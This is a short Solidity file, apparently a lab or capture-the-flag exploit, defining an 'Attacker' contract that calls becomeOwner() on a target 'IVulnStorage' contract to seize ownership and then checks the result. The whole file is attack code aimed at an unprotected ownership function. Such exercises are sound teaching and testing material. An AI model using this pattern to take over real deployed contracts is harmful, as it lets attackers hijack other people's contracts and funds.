// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface IVulnStorage {
    function becomeOwner() external;
    function isOwner() external view returns (bool);
}

contract Attacker {
    IVulnStorage public target;

    constructor(address _target) {
        target = IVulnStorage(_target);
    }

    function attack() public {
        target.becomeOwner();
    }

    function checkOwner() public view returns (bool) {
        return target.isOwner();
    }
}
